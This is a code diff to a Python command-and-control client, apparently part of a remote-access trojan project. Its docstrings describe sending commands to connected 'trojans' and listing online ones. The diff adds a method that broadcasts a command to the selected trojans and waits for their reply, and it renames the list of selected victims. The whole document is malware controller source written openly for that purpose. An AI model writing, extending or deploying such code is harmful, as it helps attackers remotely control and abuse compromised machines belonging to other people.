@@ -13,7 +13,7 @@ class FlowControlClient(TCPClient):
     def __init__(self, serverip="127.0.0.1"):
         super(FlowControlClient, self).__init__(serverip)
         self.available = []
-        self.connected = []
+        self.cache = []
         self.last_update = None
         self.end_seq = "<|end|>"
 
@@ -50,10 +50,24 @@ class FlowControlClient(TCPClient):
         :return:(void)
         """
         prefix = "["
-        for name in self.connected:
+        for name in self.cache:
             prefix += name + ","
         prefix = prefix[:-1] + "]"
         self.send(prefix + command)
+
+    def execute_wait(self, command):
+        """
+        Sends the command passed to all trojans currently connected in the cache, then it waits until a reply has been
+        received, whcih it then returns
+        :param command: (string) the command to be sent to the trojans
+        :return: (void)
+        """
+        # actually issueing the command
+        self.execute(command)
+        # blocking with a while loop until a reply has arrived
+        while len(self.receive_buffer) == 0:
+            time.sleep(0.01)
+        return self.receive()
 
     def add(self, *names):
         """
@@ -63,7 +77,7 @@ class FlowControlClient(TCPClient):
         """
         for name in names:
             if name in self.available:
-                self.connected.append(name)
+                self.cache.append(name)
 
     def remove(self, *names):
         """
@@ -72,15 +86,15 @@ class FlowControlClient(TCPClient):
         :return: (void)
         """
         for name in names:
-            if name in self.connected:
-                self.connected.remove(name)
+            if name in self.cache:
+                self.cache.remove(name)
 
     def get_info_available(self):
         """
         returns a list of currently online trojans
         :return: (string)
         """
-        string = "The following trojans are online, requested {0}s ago\n"
+        string = "The following trojans are online, requested {0}s ago\n".format(str(time.time() - self.last_update))
         for name in self.available:
             string += " - {0}\n".format(name)
-        return string
+        return string[:-1]
